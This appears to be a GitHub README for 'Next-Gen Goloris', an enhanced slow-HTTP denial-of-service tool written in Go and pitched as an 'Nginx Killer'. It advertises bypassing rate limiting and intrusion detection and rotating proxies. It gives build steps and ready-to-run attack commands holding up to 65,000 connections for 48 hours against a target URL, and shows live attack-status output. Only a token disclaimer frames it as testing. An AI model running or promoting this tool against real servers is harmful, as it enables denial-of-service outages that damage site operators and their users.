# 🔥 Next-Gen Goloris Attack - Nginx Killer 🚀

### **💀 Overview**

This is an **enhanced version of Goloris**, designed to **bypass modern Nginx protections** and **take down any unprotected or weakly configured Nginx server**. It utilizes **slow HTTP attacks**, **socket exhaustion**, and **persistent flooding** to **consume all available connections**, leading to a **complete server failure**.

---

## **🚀 Features**

👉 **Bypasses Modern Nginx Security Measures (All Versions)**\
👉 **Slow Read & Write Attack (Bypasses Rate-Limiting & IDS Detection)**\
👉 **Massively Increases TCP Socket Consumption (Max Server Load)**\
👉 **Auto-Reconnect on Drop (Ensures Persistent Attack)**\
👉 **Supports HTTP/2 + WebSockets for Advanced Connection Overload**\
👉 **Proxy Support (Unlimited IP Rotation & Infinite Scaling)**\
👉 **Customizable Attack Duration, Connection Limits, and Ramp-Up Speed**\
👉 **Live Attack Monitoring (Displays Holding Connections, Total Attempts, CPS)**

---

## **💎 Requirements**

- Go 1.17+ installed
- Linux/macOS/Windows
- A target Nginx server (vulnerable/unprotected)
- Proxy list (if using proxies for IP rotation)

---

## **💾 Installation**

### **1️⃣ Install Go**

If Go is not installed, install it with:

```sh
sudo apt install golang -y      # Ubuntu/Debian
sudo yum install golang -y      # CentOS/RHEL
brew install go                 # macOS
choco install golang             # Windows (via Chocolatey)
```

### **2️⃣ Clone the Repository**

```sh
git clone https://github.com/your-repo/nginx-goloris-killer.git
cd nginx-goloris-killer
```

### **3️⃣ Build the Script**

```sh
go build -o goloris main.go
```

---

## **🔥 How to Run**

### **Basic Attack**

```sh
./goloris -url https://target.com -duration 24h -workers 5000 -ramp 1ms
```

This command will:

- Attack `https://target.com`
- Run for `24 hours`
- Hold `5,000 persistent connections`
- Use a `1ms ramp-up interval` to establish connections quickly

### **Advanced Attack with Proxy Support**

```sh
./goloris -url https://target.com -duration 48h -workers 65000 -ramp 1ms -proxies proxies.txt
```

- Uses a **proxy list (********`proxies.txt`********\*\*\*\*\*\*\*\*\*\*\*\*)** to **rotate IPs** and bypass **IP-based rate limiting**
- **Holds up to 65,000 connections per IP**
- **Runs for 48 hours**
- **Breaks through Nginx’s security layers**

---

## **📊 Live Attack Monitoring**

During the attack, you will see **real-time attack status**:

```sh
💀 [LIVE STATUS] Holding: 4987 | Total Attempts: 105298 | CPS: 430
```

- **Holding** = Active, sustained connections
- **Total Attempts** = Total number of connection attempts
- **CPS** = New connections per second

---

---

## **⚠️ Disclaimer**

This script is designed for **educational and security testing purposes only**. Unauthorized usage against any system you do not own or have explicit permission to test **is illegal** and **violates cybersecurity laws**.

**By using this software, you take full responsibility for any actions performed.**

---

## **🛠️ Credits & Contributions**

- Original Goloris concept by [valyala](https://github.com/valyala/goloris)
- Enhanced version by **hanphlc**



